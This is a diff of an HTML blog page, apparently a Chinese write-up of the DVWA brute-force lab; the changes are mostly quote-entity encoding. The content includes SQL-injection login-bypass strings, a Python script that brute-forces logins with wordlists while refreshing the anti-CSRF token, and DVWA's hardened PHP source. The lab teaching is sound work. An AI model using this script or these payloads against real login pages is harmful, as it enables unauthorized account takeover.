@@ -10,7 +10,7 @@
 <meta itemprop="name" content="Dvwa_brute_force">
 <meta itemprop="description" content="DVWA_Brute Force（暴力破解） 这是一个有登录功能，也就是数据库校验功能的页面，从页面上不难看出，可能的漏洞点是暴力破解 LOW 截取low级别的请求报文，"><meta itemprop="datePublished" content="2020-12-28T13:16:25+08:00" />
 <meta itemprop="dateModified" content="2020-12-28T13:16:25+08:00" />
-<meta itemprop="wordCount" content="2498"><meta itemprop="image" content="https://www.a1ee.cn/bg.png">
+<meta itemprop="wordCount" content="2530"><meta itemprop="image" content="https://www.a1ee.cn/bg.png">
 <meta itemprop="keywords" content="dvwa," /><meta property="og:title" content="Dvwa_brute_force" />
 <meta property="og:description" content="DVWA_Brute Force（暴力破解） 这是一个有登录功能，也就是数据库校验功能的页面，从页面上不难看出，可能的漏洞点是暴力破解 LOW 截取low级别的请求报文，" />
 <meta property="og:type" content="article" />
@@ -98,11 +98,11 @@
 <p>工具使用完成后，再来看看源代码上是怎么实现的：</p>
 <p><img src="/dvwa_images/20200824223358938_7412.png" alt=""></p>
 <p>这个代码原理很简陋，并未做任何过滤。</p>
-<pre tabindex="0"><code>$query  = &quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';&quot;;
+<pre tabindex="0"><code>$query  = &#34;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&#34;;
 </code></pre><p>这条很直白的说明了，万用密码的可能：</p>
-<pre tabindex="0"><code>admin' #
-admin' -- -
-admin' and 1=1#
+<pre tabindex="0"><code>admin&#39; #
+admin&#39; -- -
+admin&#39; and 1=1#
 </code></pre><h2 id="medium">MEDIUM<a href="#medium" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
 <p>抓包重发，发现响应存在延迟，并未锁死账户，仍可暴力破解，这里就不演示了，万用密码已经不可用，说明是存在了过滤的，查看源代码：</p>
 <p><img src="/dvwa_images/20200826213611209_1407.png" alt=""></p>
@@ -119,41 +119,41 @@ admin' and 1=1#
 <pre tabindex="0"><code>import requests,re,click
 
 @click.command()
-@click.option('-u', '--username', prompt='Your username file path: ', help='需要加载的用户名字典路径.')
-@click.option('-p', '--password', prompt='Your password file path: ', help='需要加载的密码字典路径.')
-@click.option('-P', '--phpsession', prompt='Current phpsession id: ', help='当前web前端使用的phpsession参数.')
-@click.option('-U', '--url', prompt='url: ', help='实验环境中需要爆破的url地址.')
+@click.option(&#39;-u&#39;, &#39;--username&#39;, prompt=&#39;Your username file path: &#39;, help=&#39;需要加载的用户名字典路径.&#39;)
+@click.option(&#39;-p&#39;, &#39;--password&#39;, prompt=&#39;Your password file path: &#39;, help=&#39;需要加载的密码字典路径.&#39;)
+@click.option(&#39;-P&#39;, &#39;--phpsession&#39;, prompt=&#39;Current phpsession id: &#39;, help=&#39;当前web前端使用的phpsession参数.&#39;)
+@click.option(&#39;-U&#39;, &#39;--url&#39;, prompt=&#39;url: &#39;, help=&#39;实验环境中需要爆破的url地址.&#39;)
 
 def main(username, password, phpsession, url):
-    &quot;&quot;&quot;DVWA Brute Force high python3 script.\n
-    You need to set the following parameters.&quot;&quot;&quot;
-    headers = {&quot;Cookie&quot;:&quot;security=high; PHPSESSID=&quot; + phpsession}
+    &#34;&#34;&#34;DVWA Brute Force high python3 script.\n
+    You need to set the following parameters.&#34;&#34;&#34;
+    headers = {&#34;Cookie&#34;:&#34;security=high; PHPSESSID=&#34; + phpsession}
     response_page = requests.get(url,headers=headers)
-    user_token = re.findall(&quot;(?&lt;=&lt;input type='hidden' name='user_token' value=').+?(?=' /&gt;)&quot;,response_page.text)[0]
+    user_token = re.findall(&#34;(?&lt;=&lt;input type=&#39;hidden&#39; name=&#39;user_token&#39; value=&#39;).+?(?=&#39; /&gt;)&#34;,response_page.text)[0]
     flag = False
     total = 0
-    name_list = open(username, 'r')
+    name_list = open(username, &#39;r&#39;)
     for name in name_list:
     	uname = name.strip()
-    	pwd_list = open(password, 'r')
+    	pwd_list = open(password, &#39;r&#39;)
     	for pwd in pwd_list:
     		passwd = pwd.strip()
-    		params = {'username': uname, 'password': passwd, 'Login': 'login','user_token':user_token}
+    		params = {&#39;username&#39;: uname, &#39;password&#39;: passwd, &#39;Login&#39;: &#39;login&#39;,&#39;user_token&#39;:user_token}
     		response_page = requests.get(url, params=params, headers=headers)
-    		if &quot;Username and/or password incorrect.&quot; in response_page.text:
+    		if &#34;Username and/or password incorrect.&#34; in response_page.text:
     			flag = False
     			total+=1
     		else:
     			flag = True
     			total+=1
-    		user_token = re.findall(&quot;(?&lt;=&lt;input type='hidden' name='user_token' value=').+?(?=' /&gt;)&quot;,response_page.text)[0]
+    		user_token = re.findall(&#34;(?&lt;=&lt;input type=&#39;hidden&#39; name=&#39;user_token&#39; value=&#39;).+?(?=&#39; /&gt;)&#34;,response_page.text)[0]
     		if flag == True:
-    			click.secho('username:%s\t,password:%s\tThis is a valid combination!' %(uname, passwd), fg='green')
+    			click.secho(&#39;username:%s\t,password:%s\tThis is a valid combination!&#39; %(uname, passwd), fg=&#39;green&#39;)
     	pwd_list.close()
     name_list.close()
-    click.secho('All dictionaries have been run, total: %d' %total)
+    click.secho(&#39;All dictionaries have been run, total: %d&#39; %total)
 
-if __name__ == '__main__':
+if __name__ == &#39;__main__&#39;:
     main()
 </code></pre><p>脚本为了增加通用性，引入了命令行参数的方式，输入用户名字典，密码字典，cookie中的phpsession，以及需要爆破的url，即可完成开始爆破，并未采用错误回显，将会一直运行，当遇到正确的用户名密码时，将输出到命令行，运行结束时，会输出结束提示及总共跑了多少组用户名密码组合。</p>
 <h2 id="impossible">IMPOSSIBLE<a href="#impossible" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
@@ -163,19 +163,19 @@ if __name__ == '__main__':
 <p>接下来看看代码实现：</p>
 <pre tabindex="0"><code>&lt;?php
 
-if( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; isset ($_POST['password']) ) {
+if( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {
     // Check Anti-CSRF token
-    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
 
     // Sanitise username input
-    $user = $_POST[ 'username' ];
+    $user = $_POST[ &#39;username&#39; ];
     $user = stripslashes( $user );
-    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $user = ((isset($GLOBALS[&#34;___mysqli_ston&#34;]) &amp;&amp; is_object($GLOBALS[&#34;___mysqli_ston&#34;])) ? mysqli_real_escape_string($GLOBALS[&#34;___mysqli_ston&#34;],  $user ) : ((trigger_error(&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;, E_USER_ERROR)) ? &#34;&#34; : &#34;&#34;));
 
     // Sanitise password input
-    $pass = $_POST[ 'password' ];
+    $pass = $_POST[ &#39;password&#39; ];
     $pass = stripslashes( $pass );
-    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = ((isset($GLOBALS[&#34;___mysqli_ston&#34;]) &amp;&amp; is_object($GLOBALS[&#34;___mysqli_ston&#34;])) ? mysqli_real_escape_string($GLOBALS[&#34;___mysqli_ston&#34;],  $pass ) : ((trigger_error(&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;, E_USER_ERROR)) ? &#34;&#34; : &#34;&#34;));
     $pass = md5( $pass );
 
     // Default values
@@ -184,78 +184,78 @@ if( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; 
     $account_locked     = false;
 
     // Check the database (Check user information)
-    $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
-    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
     $data-&gt;execute();
     $row = $data-&gt;fetch();
 
     // Check to see if the user has been locked out.
-    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) )  {
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  {
         // User locked out.  Note, using this method would allow for user enumeration!
-        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;
+        //echo &#34;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&#34;;
 
         // Calculate when the user would be allowed to login again
-        $last_login = strtotime( $row[ 'last_login' ] );
+        $last_login = strtotime( $row[ &#39;last_login&#39; ] );
         $timeout    = $last_login + ($lockout_time * 60);
         $timenow    = time();
 
         /*
-        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;
-        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;
-        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;
+        print &#34;The last login was: &#34; . date (&#34;h:i:s&#34;, $last_login) . &#34;&lt;br /&gt;&#34;;
+        print &#34;The timenow is: &#34; . date (&#34;h:i:s&#34;, $timenow) . &#34;&lt;br /&gt;&#34;;
+        print &#34;The timeout is: &#34; . date (&#34;h:i:s&#34;, $timeout) . &#34;&lt;br /&gt;&#34;;
         */
 
-        // Check to see if enough time has passed, if it hasn't locked the account
+        // Check to see if enough time has passed, if it hasn&#39;t locked the account
         if( $timenow &lt; $timeout ) {
             $account_locked = true;
-            // print &quot;The account is locked&lt;br /&gt;&quot;;
+            // print &#34;The account is locked&lt;br /&gt;&#34;;
         }
     }
 
     // Check the database (if username matches the password)
-    $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
-    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR);
-    $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR );
+    $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);
+    $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );
     $data-&gt;execute();
     $row = $data-&gt;fetch();
 
     // If its a valid login...
     if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {
         // Get users details
-        $avatar       = $row[ 'avatar' ];
-        $failed_login = $row[ 'failed_login' ];
-        $last_login   = $row[ 'last_login' ];
+        $avatar       = $row[ &#39;avatar&#39; ];
+        $failed_login = $row[ &#39;failed_login&#39; ];
+        $last_login   = $row[ &#39;last_login&#39; ];
 
         // Login successful
-        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;
-        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;
+        echo &#34;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&#34;;
+        echo &#34;&lt;img src=\&#34;{$avatar}\&#34; /&gt;&#34;;
 
         // Had the account been locked out since last login?
         if( $failed_login &gt;= $total_failed_login ) {
-            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;
-            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;
+            echo &#34;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&#34;;
+            echo &#34;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&#34;;
         }
 
         // Reset bad login count
-        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;' );
-        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &#34;0&#34; WHERE user = (:user) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
         $data-&gt;execute();
     } else {
         // Login failed
         sleep( rand( 2, 4 ) );
 
         // Give the user some feedback
-        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;
+        echo &#34;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&#34;;
 
         // Update bad login count
-        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
-        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
         $data-&gt;execute();
     }
 
     // Set the last login time
-    $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
-    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
     $data-&gt;execute();
 }
 
@@ -293,7 +293,7 @@ generateSessionToken();
 
 
 
-	<script src="https://www.a1ee.cn/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	<script src="https://www.a1ee.cn/js/bundle.min.8256b8724b9578bbdf6d6f04c894255bc760e78e8a2d60ec0a91ea993acd3b77.js" integrity="sha256-gla4ckuVeLvfbW8EyJQlW8dg546KLWDsCpHqmTrNO3c=" crossorigin="anonymous"></script>
 	
 
 </body>
